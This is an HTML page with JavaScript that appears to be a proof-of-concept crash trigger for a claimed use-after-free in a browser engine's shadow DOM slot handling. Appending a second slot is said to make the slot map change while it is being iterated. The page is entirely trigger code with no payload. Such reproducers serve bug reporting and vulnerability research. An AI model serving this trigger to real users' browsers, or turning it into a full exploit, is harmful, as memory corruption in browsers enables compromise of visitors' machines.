<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
</style>
</head>
<body>
<div id="log"></div>
<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== SLOTASSIGNMENT ITERATOR INVALIDATION ===", "info");
log("[*] Building the Shadow DOM trap...", "info");

let host = document.createElement('div');
document.body.appendChild(host);
let shadow = host.attachShadow({ mode: 'open' });

// We need an initial slot and an assigned node to set up the state
let slot1 = document.createElement('slot');
slot1.name = 'slot_a';
shadow.appendChild(slot1);

let child = document.createElement('span');
child.slot = 'slot_a';
host.appendChild(child);

log("[*] Initial state set. Now we force a mutation...", "info");

setTimeout(() => {
    log("[!] Triggering resolveSlotsAfterSlotMutation!", "warn");
    log("[!] The C++ code will start iterating over m_slots...", "warn");
    
    // Adding a new slot triggers resolveSlotsAfterSlotMutation.
    // While iterating, it calls hasAssignedNodes(), which calls assignSlots().
    // assignSlots() MUTATES the m_slots map while it is being iterated!
    // Result: Iterator invalidation -> Use-After-Free!
    
    let slot2 = document.createElement('slot');
    slot2.name = 'slot_b';
    
    log("[*] Appending the second slot. Brace for impact...", "hit");
    
    try {
        shadow.appendChild(slot2);
        log("[-] If you see this, it survived (or the allocator masked the corruption).", "info");
    } catch(e) {
        log("[-] Error: " + e.message, "info");
    }
}, 500);
</script>
</body>
</html>
